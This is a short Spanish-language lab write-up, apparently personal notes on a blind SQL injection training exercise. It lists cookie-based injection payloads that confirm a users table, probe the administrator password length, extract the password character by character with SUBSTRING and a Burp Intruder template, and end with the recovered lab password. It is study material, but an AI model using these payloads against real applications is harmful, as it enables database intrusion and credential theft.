# 11 Lab: Blind SQL injection with conditional responses

Si el parametro de Cookie es correcto, nos mostrará el WELCOME BACK

```jsx
' AND '1'='1;
/// EXISTE TABLA USERS Y fila administrator
' AND (SELECT 'a' FROM users LIMIT 1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
/// Obtener longitud de la clave, obtenemos que tiene 19 caracteres
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
// Probamos con Intruder
' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§;
son 19 caracteres, estos pueden ser minuscular y caracteres alfanumericos

administrator
vo60jlee4jbqx13nv8gg
```

![Untitled](11%20Lab%20Blind%20SQL%20injection%20with%20conditional%20respon%2017efab5460ec81699b7de6b7f2f9b3f3/Untitled.png)

![Untitled](11%20Lab%20Blind%20SQL%20injection%20with%20conditional%20respon%2017efab5460ec81699b7de6b7f2f9b3f3/Untitled%201.png)

![Untitled](11%20Lab%20Blind%20SQL%20injection%20with%20conditional%20respon%2017efab5460ec81699b7de6b7f2f9b3f3/Untitled%202.png)

![Untitled](11%20Lab%20Blind%20SQL%20injection%20with%20conditional%20respon%2017efab5460ec81699b7de6b7f2f9b3f3/Untitled%203.png)

![Untitled](11%20Lab%20Blind%20SQL%20injection%20with%20conditional%20respon%2017efab5460ec81699b7de6b7f2f9b3f3/Untitled%204.png)

![Untitled](11%20Lab%20Blind%20SQL%20injection%20with%20conditional%20respon%2017efab5460ec81699b7de6b7f2f9b3f3/Untitled%205.png)

hghgf